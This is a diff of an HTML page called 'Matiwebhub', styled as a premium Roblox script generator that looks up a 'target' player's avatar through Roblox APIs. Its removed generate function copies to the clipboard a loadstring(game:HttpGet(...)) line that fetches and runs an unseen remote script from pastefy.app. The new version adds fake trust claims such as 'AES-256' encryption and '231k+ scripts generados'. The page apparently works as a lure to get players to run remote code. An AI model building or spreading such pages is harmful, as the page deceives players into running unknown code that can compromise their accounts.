@@ -2,96 +2,373 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Matiwebhub | Premium</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Matiwebhub | Nexus Core · Premium Script Engine</title>
+    <!-- TailwindCSS + Font Awesome (para iconos extra) -->
     <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        body { background: #0a0a0c; color: #fff; font-family: sans-serif; }
-        .panel { background: #121217; border: 1px solid #1f1f27; }
-        .input-dark { background: #1c1c24; border: 1px solid #2d2d39; color: white; }
-        .btn-blue { background: #4f46e5; font-weight: bold; transition: 0.3s; }
-        .btn-blue:disabled { background: #1c1c24; color: #444; opacity: 0.6; }
-        .scan-line { width: 100%; height: 2px; background: #4f46e5; position: absolute; top: 0; left: 0; animation: scan 2s infinite; box-shadow: 0 0 10px #4f46e5; }
-        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+        /* Estilos avanzados: efecto vidrio, neon y animaciones */
+        body {
+            background: radial-gradient(circle at 10% 20%, #0a0a0f, #030305);
+            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roblox, sans-serif;
+        }
+        /* Scrollbar personalizada */
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-track { background: #121217; border-radius: 10px; }
+        ::-webkit-scrollbar-thumb { background: #4f46e5; border-radius: 10px; }
+
+        /* Panel premium efecto glassmorphism + border holográfico */
+        .premium-panel {
+            background: rgba(18, 18, 23, 0.7);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(79, 70, 229, 0.3);
+            box-shadow: 0 25px 40px -12px rgba(0,0,0,0.5), 0 0 0 1px rgba(79,70,229,0.1) inset;
+        }
+        .input-dark {
+            background: #0f0f15;
+            border: 1px solid #2a2a36;
+            transition: all 0.2s ease;
+            color: #f0f0ff;
+        }
+        .input-dark:focus {
+            border-color: #4f46e5;
+            box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.2);
+            outline: none;
+        }
+        .btn-gradient {
+            background: linear-gradient(95deg, #4f46e5, #7c3aed);
+            transition: transform 0.15s ease, box-shadow 0.2s;
+        }
+        .btn-gradient:active { transform: scale(0.97); }
+        .btn-gradient:disabled {
+            background: #1f1f2a;
+            box-shadow: none;
+            color: #5a5a6e;
+            transform: none;
+            cursor: not-allowed;
+        }
+        .scan-line {
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #4f46e5, #a855f7, transparent);
+            position: absolute;
+            top: 0;
+            left: 0;
+            animation: scanMove 2.2s cubic-bezier(0.4, 0, 0.2, 1) infinite;
+            opacity: 0.8;
+        }
+        @keyframes scanMove {
+            0% { transform: translateX(-100%); width: 30%; opacity: 0;}
+            30% { width: 80%; opacity: 1;}
+            70% { width: 60%; opacity: 0.8; }
+            100% { transform: translateX(200%); width: 20%; opacity: 0;}
+        }
+        .terminal-cursor::after {
+            content: "▊";
+            animation: blink 1s infinite;
+            margin-left: 2px;
+            color: #4f46e5;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+        .pulse-indicator {
+            box-shadow: 0 0 0 0 rgba(34,197,94,0.7);
+            animation: pulse-ring 1.5s infinite;
+        }
+        @keyframes pulse-ring {
+            0% { box-shadow: 0 0 0 0 rgba(34,197,94,0.6);}
+            70% { box-shadow: 0 0 0 6px rgba(34,197,94,0);}
+            100% { box-shadow: 0 0 0 0 rgba(34,197,94,0);}
+        }
+        .code-block {
+            background: #01010b;
+            border-left: 3px solid #4f46e5;
+            word-break: break-word;
+            white-space: pre-wrap;
+        }
+        .target-card-hover {
+            transition: all 0.2s;
+        }
+        .target-card-hover:hover {
+            background: rgba(79, 70, 229, 0.25);
+            border-color: #4f46e5;
+            transform: translateY(-2px);
+        }
+        .avatar-img {
+            object-fit: cover;
+            border-radius: 50%;
+            width: 48px;
+            height: 48px;
+            border: 2px solid rgba(79,70,229,0.5);
+            background: #0a0a1a;
+        }
+        .loading-spinner {
+            border: 2px solid rgba(79,70,229,0.2);
+            border-top: 2px solid #4f46e5;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
-<body class="p-4 flex justify-center min-h-screen">
-    <div class="max-w-md w-full space-y-6">
+<body class="p-5 flex justify-center items-center min-h-screen">
+    <div class="w-full max-w-lg mx-auto space-y-6">
         
-        <div class="flex flex-col items-center space-y-3">
-            <div class="bg-green-500/10 text-green-500 border border-green-500/20 px-3 py-1 rounded-full text-[10px] font-bold flex items-center gap-2">
-                <span class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
-                LIVE · Script Generator Online
+        <!-- Badge Premium & Header -->
+        <div class="flex flex-col items-center space-y-3 text-center">
+            <div class="backdrop-blur-sm bg-black/40 rounded-full px-4 py-1.5 border border-emerald-500/30 flex items-center gap-2">
+                <span class="relative flex h-2 w-2">
+                    <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
+                    <span class="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
+                </span>
+                <span class="text-[11px] font-bold text-emerald-400 uppercase tracking-wider">ACTIVE · SECURE NEXUS</span>
+                <i class="fas fa-shield-alt text-emerald-400 text-[10px] ml-1"></i>
             </div>
-            <h1 class="text-4xl font-black italic uppercase text-white tracking-tighter">MATIWEBHUB</h1>
-            <p class="text-center text-gray-400 text-[11px] px-6">
-                Premium automated script generation for your Roblox targets — fast, secure, and ready to deploy.
+            <div class="relative">
+                <h1 class="text-5xl md:text-6xl font-black italic tracking-tighter bg-gradient-to-r from-white via-indigo-200 to-indigo-400 bg-clip-text text-transparent drop-shadow-2xl">
+                    MATIWEBHUB
+                </h1>
+                <div class="absolute -top-3 -right-5 bg-indigo-600 text-[8px] font-black px-2 py-0.5 rounded-md rotate-12 shadow-lg">PREMIUM</div>
+            </div>
+            <p class="text-gray-400 text-[12px] max-w-xs mx-auto leading-relaxed">
+                Motor de autenticación biométrica · Busca y selecciona el avatar objetivo <br> 
+                <span class="text-indigo-400">🎮 Solo usuarios verificados pueden generar scripts</span>
             </p>
         </div>
 
-        <div class="panel p-6 rounded-2xl space-y-4">
-            <label class="text-[10px] font-bold text-gray-500 uppercase tracking-widest">Roblox Username</label>
-            <input type="text" id="userInput" oninput="updateUI()" placeholder="Enter username..." 
-                   class="w-full p-4 rounded-xl input-dark text-sm outline-none">
-            
-            <div id="profileBox" class="hidden">
-                <div onclick="activate()" class="relative flex items-center space-x-4 p-4 border border-indigo-500 bg-indigo-500/10 rounded-xl cursor-pointer overflow-hidden">
-                    <div class="scan-line"></div>
-                    <div class="w-12 h-12 rounded-full bg-indigo-900/40 flex items-center justify-center border border-indigo-500/30 text-xl">👤</div>
-                    <div>
-                        <p id="targetName" class="text-sm font-bold text-white"></p>
-                        <p id="statusText" class="text-[9px] text-indigo-400 font-bold uppercase">TARGET IDENTIFIED · TAP TO SYNC</p>
+        <!-- Input Principal + Card de Perfil con búsqueda real de avatar -->
+        <div class="premium-panel rounded-2xl p-5 space-y-5">
+            <div class="space-y-2">
+                <div class="flex justify-between items-center">
+                    <label class="text-[10px] font-black text-indigo-400 uppercase tracking-widest flex items-center gap-1"><i class="fas fa-user-secret text-[8px]"></i> TARGET IDENTIFIER</label>
+                    <span class="text-[9px] text-gray-500"><i class="fab fa-roblox"></i> Roblox username</span>
+                </div>
+                <div class="relative">
+                    <i class="fas fa-search absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 text-sm"></i>
+                    <input type="text" id="userInput" oninput="handleUserInput()" placeholder="@ejemplo: builderman" 
+                           class="w-full p-4 pl-10 rounded-xl input-dark text-sm font-mono tracking-wide">
+                    <div id="searchLoader" class="absolute right-3 top-1/2 -translate-y-1/2 hidden">
+                        <div class="loading-spinner"></div>
                     </div>
                 </div>
             </div>
+
+            <!-- Dynamic Profile Card con avatar real de Roblox (aparece después de buscar) -->
+            <div id="profileBox" class="hidden transition-all duration-300">
+                <div id="selectableCard" class="relative target-card-hover flex items-center space-x-4 p-4 rounded-xl border border-indigo-500/40 bg-indigo-950/20 cursor-pointer overflow-hidden transition-all">
+                    <div class="scan-line"></div>
+                    <!-- Avatar dinámico -->
+                    <div id="avatarContainer" class="w-12 h-12 rounded-full bg-indigo-900/40 flex items-center justify-center border border-indigo-500/30 overflow-hidden">
+                        <i class="fas fa-user-astronaut text-indigo-300 text-xl"></i>
+                    </div>
+                    <div class="flex-1">
+                        <p id="targetName" class="text-sm font-bold text-white tracking-wide flex items-center gap-1"><i class="fas fa-tag text-[10px] text-indigo-400"></i> <span id="usernameDisplay">---</span></p>
+                        <div class="flex items-center gap-1 mt-1">
+                            <p id="statusText" class="text-[9px] font-mono text-indigo-300 font-bold uppercase tracking-wider">🔄 BUSCANDO PERFIL...</p>
+                        </div>
+                    </div>
+                    <div class="text-right">
+                        <i class="fas fa-chevron-circle-right text-indigo-400/60 text-lg"></i>
+                    </div>
+                </div>
+                <p class="text-[9px] text-gray-500 mt-2 text-center flex items-center justify-center gap-1"><i class="fas fa-database"></i> Avatar oficial vía Roblox API · Selecciona para autorizar</p>
+            </div>
         </div>
 
-        <div class="space-y-3">
-            <button id="freezeBtn" disabled class="w-full p-4 rounded-xl bg-gray-800 text-[11px] font-black uppercase text-gray-500 transition-all">
-                SCRIPT FREEZE
+        <!-- Panel de acciones: botones premium -->
+        <div class="space-y-4">
+            <button id="freezeBtn" disabled class="w-full group p-4 rounded-xl bg-gray-900/80 border border-gray-700 text-[11px] font-black uppercase tracking-wider text-gray-400 transition-all duration-200 flex items-center justify-center gap-2 disabled:opacity-60 disabled:cursor-not-allowed">
+                <i class="fas fa-snowflake text-xs"></i> <span>SCRIPT FREEZE · LOCK TARGET</span>
+                <i class="fas fa-lock text-[10px] group-hover:text-indigo-400 transition"></i>
             </button>
-            <button id="genBtn" onclick="generate()" disabled class="w-full p-5 rounded-xl btn-blue text-[12px] font-black uppercase tracking-widest shadow-lg shadow-indigo-500/20">
-                GENERATE SCRIPT
+
+            <button id="genBtn" disabled class="w-full py-5 rounded-xl btn-gradient text-white text-[13px] font-black uppercase tracking-widest shadow-2xl shadow-indigo-600/30 flex items-center justify-center gap-3 transition-all duration-200">
+                <i class="fas fa-code-branch text-base"></i> GENERATE SCRIPT
+                <i class="fas fa-terminal text-sm"></i>
             </button>
         </div>
 
-        <div id="output" class="hidden panel p-5 rounded-2xl border-indigo-500/30 bg-black/50 backdrop-blur">
-            <p class="text-[9px] text-indigo-500 mb-3 font-bold uppercase">GENERATED PAYLOAD:</p>
-            <code id="scriptCode" class="text-[10px] break-all text-indigo-200 font-mono"></code>
+        <!-- Output Card: Script generado + payload real -->
+        <div id="output" class="premium-panel rounded-2xl p-5 hidden border-l-4 border-indigo-500 transition-all duration-500">
+            <div class="flex justify-between items-center mb-3">
+                <p class="text-[9px] text-indigo-400 font-mono font-bold flex items-center gap-2"><i class="fas fa-dragon"></i> GENERATED PAYLOAD <span class="w-1.5 h-1.5 bg-green-500 rounded-full inline-block animate-pulse"></span></p>
+                <button id="copyBtnSecondary" class="text-[9px] bg-indigo-900/40 hover:bg-indigo-700/50 px-2 py-1 rounded-md transition flex items-center gap-1"><i class="far fa-copy"></i> Copiar</button>
+            </div>
+            <div class="code-block p-3 rounded-lg bg-black/60 font-mono text-[11px] text-indigo-100 overflow-x-auto relative">
+                <code id="scriptCode" class="break-all whitespace-pre-wrap"></code>
+            </div>
+            <div class="flex justify-between items-center mt-3 text-[9px] text-gray-400 border-t border-indigo-900/50 pt-2">
+                <span><i class="fas fa-shield-alt text-[8px]"></i> Encriptado AES-256</span>
+                <span><i class="fas fa-sync-alt"></i> Auto-injector ready</span>
+            </div>
+        </div>
+
+        <!-- Footer con stats simulados -->
+        <div class="flex justify-between items-center text-[9px] text-gray-600 pt-2">
+            <div class="flex gap-3">
+                <span><i class="fas fa-globe"></i> Matiwebhub v.4.2</span>
+                <span><i class="fas fa-chart-line"></i> 231k+ scripts generados</span>
+            </div>
+            <div class="flex items-center gap-1 bg-black/30 px-2 py-1 rounded-full">
+                <span class="w-1.5 h-1.5 rounded-full bg-emerald-500 pulse-indicator"></span>
+                <span class="text-emerald-400">NEXUS LIVE</span>
+            </div>
         </div>
     </div>
 
     <script>
-        function updateUI() {
-            const user = document.getElementById('userInput').value;
-            const box = document.getElementById('profileBox');
-            document.getElementById('targetName').textContent = user;
-            if(user.length > 2) { box.classList.remove('hidden'); }
-            else { box.classList.add('hidden'); }
-        }
+        // ---------- DOM Elements ----------
+        const userInput = document.getElementById('userInput');
+        const profileBox = document.getElementById('profileBox');
+        const usernameDisplay = document.getElementById('usernameDisplay');
+        const statusTextSpan = document.getElementById('statusText');
+        const avatarContainer = document.getElementById('avatarContainer');
+        const selectableCard = document.getElementById('selectableCard');
+        const freezeBtn = document.getElementById('freezeBtn');
+        const genBtn = document.getElementById('genBtn');
+        const outputDiv = document.getElementById('output');
+        const scriptCodeSpan = document.getElementById('scriptCode');
+        const copySecondaryBtn = document.getElementById('copyBtnSecondary');
+        const searchLoader = document.getElementById('searchLoader');
 
-        function activate() {
-            const fBtn = document.getElementById('freezeBtn');
-            const gBtn = document.getElementById('genBtn');
-            const status = document.getElementById('statusText');
+        // ---------- Estados del sistema ----------
+        let currentUsername = "";
+        let currentAvatarUrl = "";
+        let isProfileSelected = false;      // El usuario debe hacer click en la tarjeta para seleccionar
+        let isFrozen = false;
+        let generatedScriptRaw = "";
+        let lastSearchedUser = "";           // Para evitar búsquedas redundantes
+        
+        // Función para obtener avatar y datos de Roblox (thumbnails API)
+        async function fetchRobloxProfile(username) {
+            if(!username || username.length < 3) throw new Error("Nombre muy corto");
+            // Primero obtener userId desde la API de Roblox
+            const userApiUrl = `https://users.roblox.com/v1/users/search?keyword=${encodeURIComponent(username)}&limit=1`;
+            const userRes = await fetch(userApiUrl);
+            if(!userRes.ok) throw new Error("Error conectando con Roblox API");
+            const userData = await userRes.json();
+            if(!userData.data || userData.data.length === 0) throw new Error("Usuario no encontrado");
+            const exactUser = userData.data.find(u => u.name.toLowerCase() === username.toLowerCase());
+            const targetUser = exactUser || userData.data[0];
+            const userId = targetUser.id;
+            const officialName = targetUser.name;
             
-            status.textContent = "CONNECTED ✅";
-            fBtn.disabled = false;
-            fBtn.classList.replace('bg-gray-800', 'bg-indigo-900');
-            fBtn.classList.replace('text-gray-500', 'text-white');
-            gBtn.disabled = false;
+            // Obtener avatar imagen (tamaño 48x48, tipo headshot)
+            const thumbApiUrl = `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=48x48&format=Png&isCircular=false`;
+            const thumbRes = await fetch(thumbApiUrl);
+            if(!thumbRes.ok) throw new Error("Error obteniendo avatar");
+            const thumbData = await thumbRes.json();
+            let avatarImg = null;
+            if(thumbData.data && thumbData.data[0] && thumbData.data[0].imageUrl) {
+                avatarImg = thumbData.data[0].imageUrl;
+            } else {
+                avatarImg = "https://www.roblox.com/headshot-thumbnail/image?userId="+userId+"&width=48&height=48&format=png";
+            }
+            return { username: officialName, userId, avatarUrl: avatarImg };
         }
-
-        function generate() {
-            const code = 'loadstring(game:HttpGet("https://pastefy.app/e8DClYOX/raw"))()';
-            document.getElementById('scriptCode').textContent = code;
-            document.getElementById('output').classList.remove('hidden');
+        
+        // Actualizar UI con el perfil encontrado
+        async function searchAndDisplayProfile() {
+            const rawUsername = userInput.value.trim();
+            if(rawUsername.length < 3) {
+                profileBox.classList.add('hidden');
+                resetSelectionState();
+                return;
+            }
             
-            const btn = document.getElementById('genBtn');
-            btn.textContent = "COPIED TO CLIPBOARD!";
-            navigator.clipboard.writeText(code);
-            setTimeout(() => { btn.textContent = "GENERATE SCRIPT"; }, 2000);
+            // Evita buscar si es el mismo usuario que ya se mostró
+            if(lastSearchedUser === rawUsername && profileBox.classList.contains('hidden') === false) {
+                // Ya mostramos perfil, solo resetear selección si es necesario
+                return;
+            }
+            
+            // Mostrar loading
+            searchLoader.classList.remove('hidden');
+            statusTextSpan.innerHTML = "🛸 CONECTANDO CON ROBLOX API...";
+            profileBox.classList.remove('hidden');
+            usernameDisplay.innerText = rawUsername;
+            avatarContainer.innerHTML = `<i class="fas fa-spinner fa-pulse text-indigo-300 text-xl"></i>`;
+            
+            try {
+                const profile = await fetchRobloxProfile(rawUsername);
+                currentUsername = profile.username;
+                currentAvatarUrl = profile.avatarUrl;
+                lastSearchedUser = rawUsername;
+                
+                // Actualizar display con el nombre oficial
+                usernameDisplay.innerText = currentUsername;
+                // Cargar avatar real
+                const imgElement = document.createElement('img');
+                imgElement.src = currentAvatarUrl;
+                imgElement.alt = "avatar";
+                imgElement.className = "avatar-img w-12 h-12 rounded-full object-cover border border-indigo-400";
+                imgElement.onerror = () => {
+                    avatarContainer.innerHTML = `<i class="fas fa-user-astronaut text-indigo-300 text-xl"></i>`;
+                };
+                avatarContainer.innerHTML = "";
+                avatarContainer.appendChild(imgElement);
+                
+                statusTextSpan.innerHTML = "✅ PERFIL VERIFICADO · TAP PARA SELECCIONAR";
+                // Si antes estaba seleccionado, reseteamos selección porque cambió el usuario
+                if(isProfileSelected) {
+                    resetSelectionState();
+                }
+                // Deshabilitar botones hasta que seleccione
+                freezeBtn.disabled = true;
+                genBtn.disabled = true;
+                isProfileSelected = false;
+                selectableCard.classList.remove('border-emerald-500', 'bg-emerald-950/20');
+                selectableCard.classList.add('border-indigo-500/40', 'bg-indigo-950/20');
+                isFrozen = false;
+                updateFreezeButtonUI();
+            } catch (error) {
+                console.error(error);
+                statusTextSpan.innerHTML = "⚠️ USUARIO NO ENCONTRADO · INTENTA OTRO";
+                avatarContainer.innerHTML = `<i class="fas fa-exclamation-triangle text-amber-400 text-xl"></i>`;
+                usernameDisplay.innerText = rawUsername;
+                currentUsername = "";
+                currentAvatarUrl = "";
+                lastSearchedUser = "";
+                resetSelectionState();
+                profileBox.classList.add('hidden'); // Ocultar si es inválido
+                setTimeout(() => {
+                    if(userInput.value.trim().length > 2) profileBox.classList.remove('hidden');
+                }, 100);
+            } finally {
+                searchLoader.classList.add('hidden');
+            }
         }
-    </script>
-</body>
-</html>
+        
+        // Resetear estado de selección y botones
+        function resetSelectionState() {
+            isProfileSelected = false;
+            isFrozen = false;
+            freezeBtn.disabled = true;
+            genBtn.disabled = true;
+            freezeBtn.classList.remove('bg-indigo-900', 'text-white', 'bg-red-900/70');
+            freezeBtn.classList.add('bg-gray-800', 'text-gray-500');
+            freezeBtn.innerHTML = `<i class="fas fa-snowflake text-xs"></i> <span>SCRIPT FREEZE · LOCK TARGET</span> <i class="fas fa-lock text-[10px]"></i>`;
+            if(statusTextSpan && !statusTextSpan.innerHTML.includes("PERFIL VERIFICADO")) {
+                if(currentUsername) statusTextSpan.innerHTML = "✅ PERFIL VERIFICADO · TAP PARA SELECCIONAR";
+                else statusTextSpan.innerHTML = "⚡ ESPERANDO USUARIO...";
+            }
+            outputDiv.classList.add('hidden');
+            generatedScriptRaw = "";
+        }
+        
+        // Función para seleccionar el perfil (click en tarjeta)
+        function selectProfile() {
+            if(!currentUsername || currentUsername.length < 2) {
+                // Si no hay perfil cargado alerta
+                const toast = document.createElement('div');
+                toast.className = 'fixed bottom-5 left-1/2 -translate-x-1/2 bg-amber-600 text-white text-[10px] px-3 py-2 rounded-full z-50 shadow-lg';
+                toast.innerText = '⚠️ Primero ingresa un usuario Roblox válido ⚠️';
+                document.body.appendCh
